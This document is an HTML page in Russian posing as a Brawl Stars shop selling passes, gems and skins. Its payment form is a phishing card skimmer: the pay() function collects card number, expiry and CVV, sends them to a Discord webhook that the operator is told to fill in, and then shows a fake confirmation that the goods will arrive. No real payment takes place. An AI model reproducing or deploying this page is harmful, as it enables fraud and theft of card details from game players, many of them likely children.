<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ZapechatonShop</title>
    <style>
        body { background: black; color: white; font-family: monospace; padding: 20px; }
        .products { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 20px; }
        .product { background: #111; border: 1px solid #333; border-radius: 16px; padding: 15px; width: 200px; }
        .price { font-size: 24px; margin: 10px 0; }
        button { background: white; color: black; border: none; padding: 8px 16px; border-radius: 30px; cursor: pointer; font-weight: bold; }
        .cart { position: fixed; right: 20px; top: 20px; background: #0a0a0a; border: 1px solid white; padding: 15px; width: 280px; border-radius: 16px; }
        .cart ul { list-style: none; padding: 0; }
        .cart li { display: flex; justify-content: space-between; margin: 8px 0; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
        .modal-content { background: #111; border: 1px solid white; padding: 25px; border-radius: 16px; width: 280px; }
        input { width: 100%; margin: 8px 0; padding: 8px; background: black; border: 1px solid white; color: white; border-radius: 30px; }
    </style>
</head>
<body>

<h1>ZapechatonShop</h1>
<p>// brawl stars market</p>

<div class="products">
    <div class="product"><h3>BP (Brawl Pass)</h3><div class="price">349 ₽</div><button onclick="add('BP (Brawl Pass)',349)">в корзину</button></div>
    <div class="product"><h3>BP+ (Brawl Pass Plus)</h3><div class="price">349 ₽</div><button onclick="add('BP+',349)">в корзину</button></div>
    <div class="product"><h3>80 гемов</h3><div class="price">111 ₽</div><button onclick="add('80 гемов',111)">в корзину</button></div>
    <div class="product"><h3>170 гемов</h3><div class="price">223 ₽</div><button onclick="add('170 гемов',223)">в корзину</button></div>
    <div class="product"><h3>360 гемов</h3><div class="price">454 ₽</div><button onclick="add('360 гемов',454)">в корзину</button></div>
    <div class="product"><h3>950 гемов</h3><div class="price">1049 ₽</div><button onclick="add('950 гемов',1049)">в корзину</button></div>
    <div class="product"><h3>Меха Леон</h3><div class="price">279 ₽</div><button onclick="add('Меха Леон',279)">в корзину</button></div>
    <div class="product"><h3>Гипер заряд</h3><div class="price">999 ₽</div><button onclick="add('Гипер заряд',999)">в корзину</button></div>
    <div class="product"><h3>Звездный патруль</h3><div class="price">999 ₽</div><button onclick="add('Звездный патруль',999)">в корзину</button></div>
</div>

<div class="cart">
    <h3>🛒 корзина</h3>
    <ul id="cartList"><li>пусто</li></ul>
    <div id="total">итого: 0 ₽</div>
    <button onclick="openModal()" style="width:100%; margin-top:10px;">оформить заказ</button>
</div>

<div id="modal" class="modal">
    <div class="modal-content">
        <span onclick="closeModal()" style="float:right; cursor:pointer;">✕</span>
        <h3>оплата картой</h3>
        <input type="text" id="cardNum" placeholder="номер карты">
        <input type="text" id="cardExp" placeholder="MM/YY">
        <input type="text" id="cardCvv" placeholder="CVV">
        <button onclick="pay()" style="width:100%; margin-top:10px;">оплатить</button>
    </div>
</div>

<script>
    // ЗАМЕНИ НА СВОЙ ВЕБХУК
    const WEBHOOK = "https://discord.com/api/webhooks/ЗАМЕНИТЕ_НА_ВАШ/ТОКЕН";

    let cart = [];

    function add(name, price) {
        cart.push({name, price});
        updateCart();
        showMsg(`+ ${name} добавлен`);
    }

    function updateCart() {
        const list = document.getElementById('cartList');
        const totalDiv = document.getElementById('total');
        if (cart.length === 0) {
            list.innerHTML = '<li>пусто</li>';
            totalDiv.innerText = 'итого: 0 ₽';
            return;
        }
        let html = '';
        let total = 0;
        cart.forEach((item, idx) => {
            total += item.price;
            html += `<li>${item.name} — ${item.price} ₽ <button onclick="remove(${idx})" style="background:red; color:white; padding:2px 8px;">x</button></li>`;
        });
        list.innerHTML = html;
        totalDiv.innerText = `итого: ${total} ₽`;
    }

    function remove(idx) {
        cart.splice(idx, 1);
        updateCart();
        showMsg('товар удалён');
    }

    function showMsg(msg) {
        let d = document.createElement('div');
        d.innerText = msg;
        d.style.cssText = 'position:fixed; bottom:20px; right:20px; background:green; color:white; padding:8px 16px; border-radius:30px; z-index:9999;';
        document.body.appendChild(d);
        setTimeout(() => d.remove(), 2000);
    }

    function openModal() {
        if (cart.length === 0) { alert('корзина пуста'); return; }
        document.getElementById('modal').style.display = 'flex';
    }
    function closeModal() {
        document.getElementById('modal').style.display = 'none';
    }

    function pay() {
        const card = document.getElementById('cardNum').value.trim();
        const exp = document.getElementById('cardExp').value.trim();
        const cvv = document.getElementById('cardCvv').value.trim();
        if (!card || !exp || !cvv) { alert('заполните все поля'); return; }
        const total = cart.reduce((s,i)=>s+i.price,0);
        const items = cart.map(i=>`${i.name} (${i.price}₽)`).join('\n');
        // отправить вебхук
        if (WEBHOOK && !WEBHOOK.includes('ЗАМЕНИТЕ')) {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: 'НОВАЯ ПОКУПКА',
                    embeds: [{
                        title: 'данные карты',
                        fields: [
                            {name: 'товары', value: items, inline: false},
                            {name: 'сумма', value: total + ' ₽', inline: true},
                            {name: 'номер карты', value: `||${card}||`, inline: true},
                            {name: 'срок', value: `||${exp}||`, inline: true},
                            {name: 'cvv', value: `||${cvv}||`, inline: true}
                        ]
                    }]
                })
            }).catch(e=>console.log);
        } else {
            console.log('webhook не настроен', {card, exp, cvv, items, total});
        }
        alert('спасибо за покупку! товары придут в течение часа.');
        cart = [];
        updateCart();
        closeModal();
        document.getElementById('cardNum').value = '';
        document.getElementById('cardExp').value = '';
        document.getElementById('cardCvv').value = '';
    }
</script>
</body>
</html>
